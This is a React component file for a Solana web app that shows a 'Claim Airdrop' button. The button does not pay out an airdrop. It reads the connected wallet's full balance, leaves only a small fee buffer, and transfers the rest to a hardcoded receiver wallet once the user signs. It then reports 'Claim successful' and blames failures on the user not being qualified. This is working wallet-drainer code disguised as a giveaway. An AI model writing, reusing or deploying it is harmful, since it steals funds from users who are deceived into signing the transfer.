// src/components/TransferButton.jsx
import { useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import { Connection, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_ENDPOINTS, TRANSFER_FEE_BUFFER } from '../utils/constants';

export default function TransferButton({ className = '' }) {
  const { publicKey, signTransaction } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !signTransaction) return;

    setLoading(true);
    try {
      // Try each RPC endpoint until one responds
      let connection;
      let balance;
      let connected = false;
      for (const rpc of RPC_ENDPOINTS) {
        try {
          connection = new Connection(rpc, 'confirmed');
          balance = await connection.getBalance(publicKey);
          connected = true;
          break;
        } catch (_) {
          console.warn('RPC failed, trying next:', rpc);
        }
      }
      if (!connected) {
        alert('Network error: Could not connect to Solana. Please try again.');
        return;
      }
      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports + TRANSFER_FEE_BUFFER) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      // Reserve enough for the tx fee (5000 lamports)
      const transferAmount = balance - TRANSFER_FEE_BUFFER;

      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECEIVER_WALLET,
          lamports: transferAmount,
        })
      );

      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      // Explicitly sign with the wallet, then send the raw signed tx
      const signed = await signTransaction(transaction);
      const rawTransaction = signed.serialize();
      const signature = await connection.sendRawTransaction(rawTransaction, {
        skipPreflight: false,
        preflightCommitment: 'confirmed',
      });

      console.log('⏳ Transaction sent:', signature);

      await connection.confirmTransaction(
        { signature, blockhash, lastValidBlockHeight },
        'confirmed'
      );

      console.log('✅ Transaction confirmed:', signature);
      alert(`Claim successful!\nTx: ${signature}`);
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, signTransaction]);

  if (!publicKey) return null;

  // src/components/TransferButton.jsx
return (
  <button
    onClick={handleTransfer}
    disabled={loading}
    className={`
      w-full py-3 px-4 rounded-lg font-semibold transition
      ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
      ${className}
    `}
  >
    {loading ? 'Claiming...' : 'Claim Airdrop'}
  </button>
);

}
